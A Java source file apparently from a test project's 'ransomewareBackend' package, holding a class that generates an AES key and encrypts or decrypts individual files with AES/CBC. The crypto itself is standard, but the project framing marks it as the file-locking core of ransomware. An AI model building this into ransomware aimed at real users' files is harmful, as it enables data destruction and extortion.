package com.jdrll.test1.ransomewareBackend;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.Key;
import java.security.SecureRandom;

public class Cifrado {
    private SecretKey secretKey;

    public Cifrado() throws Exception {
        this.secretKey = generateKey();
    }

    private SecretKey generateKey() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128);
        return keyGen.generateKey();
    }

    public void cifrarArchivo(Archivo archivo, File archivoCifrado) throws Exception {
        doCrypto(Cipher.ENCRYPT_MODE, archivo.getArchivo(), archivoCifrado);
    }

    public void descifrarArchivo(Archivo archivo, File archivoDescifrado) throws Exception {
        doCrypto(Cipher.DECRYPT_MODE, archivo.getArchivo(), archivoDescifrado);
    }

    private void doCrypto(int cipherMode, File inputFile, File outputFile) throws Exception {
        Key secretKeySpec = new SecretKeySpec(secretKey.getEncoded(), "AES");
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");

        FileInputStream inputStream = new FileInputStream(inputFile);
        FileOutputStream outputStream = new FileOutputStream(outputFile);

        try {
            if (cipherMode == Cipher.ENCRYPT_MODE) {
                byte[] iv = new byte[cipher.getBlockSize()];
                SecureRandom random = new SecureRandom();
                random.nextBytes(iv);
                IvParameterSpec ivSpec = new IvParameterSpec(iv);

                cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivSpec);
                outputStream.write(iv); // Write IV to output file

                byte[] inputBytes = new byte[1024];
                int bytesRead;
                while ((bytesRead = inputStream.read(inputBytes)) != -1) {
                    byte[] outputBytes = cipher.update(inputBytes, 0, bytesRead);
                    if (outputBytes != null) {
                        outputStream.write(outputBytes);
                    }
                }
                byte[] outputBytes = cipher.doFinal();
                if (outputBytes != null) {
                    outputStream.write(outputBytes);
                }

            } else if (cipherMode == Cipher.DECRYPT_MODE) {
                byte[] iv = new byte[cipher.getBlockSize()];
                inputStream.read(iv); // Read IV from input file
                IvParameterSpec ivSpec = new IvParameterSpec(iv);

                cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, ivSpec);

                byte[] inputBytes = new byte[1024];
                int bytesRead;
                while ((bytesRead = inputStream.read(inputBytes)) != -1) {
                    byte[] outputBytes = cipher.update(inputBytes, 0, bytesRead);
                    if (outputBytes != null) {
                        outputStream.write(outputBytes);
                    }
                }
                byte[] outputBytes = cipher.doFinal();
                if (outputBytes != null) {
                    outputStream.write(outputBytes);
                }
            }
        } finally {
            inputStream.close();
            outputStream.close();
        }
    }

    public SecretKey getSecretKey() {
        return secretKey;
    }

    public void setSecretKey(SecretKey secretKey) {
        this.secretKey = secretKey;
    }
}
